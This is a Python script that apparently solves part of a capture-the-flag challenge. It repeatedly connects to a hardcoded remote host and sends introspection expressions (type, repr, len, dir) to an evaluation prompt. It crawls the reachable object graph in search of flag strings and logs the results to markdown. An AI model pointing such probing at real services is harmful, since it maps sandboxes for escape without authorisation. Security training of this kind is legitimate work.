#!/usr/bin/env python3
import argparse
import ast
import collections
import json
import re
import socket
import time


HOST = "66.228.50.16"
PORT = 48271


def recv_until_prompt(sock, timeout):
    sock.setblocking(False)
    end = time.time() + timeout
    data = b""
    while time.time() < end:
        try:
            chunk = sock.recv(4096)
        except BlockingIOError:
            time.sleep(0.01)
            continue
        if not chunk:
            break
        data += chunk
        if data.endswith(b"> ") or b"\n> " in data:
            break
    return data


def recv_for(sock, timeout):
    sock.setblocking(False)
    end = time.time() + timeout
    data = b""
    while time.time() < end:
        try:
            chunk = sock.recv(4096)
        except BlockingIOError:
            time.sleep(0.01)
            continue
        if not chunk:
            break
        data += chunk
    return data


def response_body(raw):
    text = raw.decode("utf-8", "replace")
    if "> " in text:
        return text.rsplit("> ", 1)[1].strip()
    return text.strip()


def classify(raw):
    body = response_body(raw)
    lines = [line.strip() for line in body.splitlines() if line.strip()]
    for line in reversed(lines):
        if line.startswith("GateError:"):
            return line, body
    if any("BDSEC{" in line for line in lines):
        return "flag", body
    if lines:
        return "pass", lines[-1]
    return "no response", body


def query(expr, host, port, prompt_timeout, response_timeout, attempts, delay):
    last = ("no response", "")
    for attempt in range(attempts):
        try:
            with socket.create_connection((host, port), timeout=prompt_timeout) as sock:
                banner = recv_until_prompt(sock, prompt_timeout)
                if b"> " not in banner:
                    last = ("no prompt", banner.decode("utf-8", "replace").strip())
                    time.sleep(delay + attempt * 0.1)
                    continue
                sock.sendall(expr.encode() + b"\n")
                raw = banner + recv_for(sock, response_timeout)
        except Exception as exc:
            last = (f"client error: {exc.__class__.__name__}", str(exc))
            time.sleep(delay + attempt * 0.1)
            continue
        outcome, body = classify(raw)
        if outcome not in {"no response", "no prompt"}:
            return outcome, body
        last = (outcome, body)
        time.sleep(delay + attempt * 0.1)
    return last


def parse_literal(body):
    try:
        return ast.literal_eval(body)
    except Exception:
        return None


def child_expr(parent, field):
    if re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*", field):
        return f"{parent}.{field}"
    return f"{parent}[{json.dumps(field)}]"


def esc(value):
    return str(value).replace("|", "\\|").replace("\n", "\\n")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default=HOST)
    parser.add_argument("--port", type=int, default=PORT)
    parser.add_argument("--start", default="root")
    parser.add_argument("--max-depth", type=int, default=8)
    parser.add_argument("--max-nodes", type=int, default=400)
    parser.add_argument("--attempts", type=int, default=3)
    parser.add_argument("--prompt-timeout", type=float, default=5)
    parser.add_argument("--response-timeout", type=float, default=2)
    parser.add_argument("--delay", type=float, default=0.04)
    parser.add_argument("--markdown", default="obsidian-gate/object_graph.md")
    args = parser.parse_args()

    queue = collections.deque([(args.start, 0)])
    seen = {args.start}
    rows = []
    found = []

    while queue and len(rows) < args.max_nodes:
        expr, depth = queue.popleft()
        row = {"expr": expr, "depth": depth}
        for probe, probe_expr in [
            ("value", expr),
            ("type", f"type({expr})"),
            ("repr", f"repr({expr})"),
            ("len", f"len({expr})"),
            ("dir", f"dir({expr})"),
        ]:
            outcome, body = query(
                probe_expr,
                args.host,
                args.port,
                args.prompt_timeout,
                args.response_timeout,
                args.attempts,
                args.delay,
            )
            row[f"{probe}_outcome"] = outcome
            row[f"{probe}_body"] = body
            if "BDSEC{" in body:
                found.append((expr, probe, body))

        rows.append(row)
        print(
            f"[{len(rows):03d}] depth={depth} {expr} -> "
            f"value={row['value_body']!r} type={row['type_body']!r} dir={row['dir_body']!r}",
            flush=True,
        )

        if depth >= args.max_depth or row["dir_outcome"] != "pass":
            continue
        fields = parse_literal(row["dir_body"])
        if not isinstance(fields, list):
            continue
        for field in fields:
            if not isinstance(field, str):
                continue
            nxt = child_expr(expr, field)
            if nxt not in seen:
                seen.add(nxt)
                queue.append((nxt, depth + 1))

    lines = [
        "# Obsidian Gate Object Graph",
        "",
        f"Target: `{args.host}:{args.port}`",
        f"Start: `{args.start}`",
        "",
        "## Flag Hits",
        "",
    ]
    if found:
        for expr, probe, body in found:
            lines.append(f"- `{expr}` via `{probe}`: `{esc(body)}`")
    else:
        lines.append("- none")
    lines += [
        "",
        "## Nodes",
        "",
        "| depth | expr | value | type | repr | len | dir |",
        "|---|---|---|---|---|---|---|",
    ]
    for row in rows:
        lines.append(
            "| {} | `{}` | `{}` | `{}` | `{}` | `{}` | `{}` |".format(
                row["depth"],
                esc(row["expr"]),
                esc(row["value_body"]),
                esc(row["type_body"]),
                esc(row["repr_body"]),
                esc(row["len_body"]),
                esc(row["dir_body"]),
            )
        )
    with open(args.markdown, "w", encoding="utf-8") as f:
        f.write("\n".join(lines) + "\n")

    print(f"[*] wrote {args.markdown}")
    if found:
        for expr, probe, body in found:
            print(f"[FLAG?] {expr} {probe}: {body}")


if __name__ == "__main__":
    main()
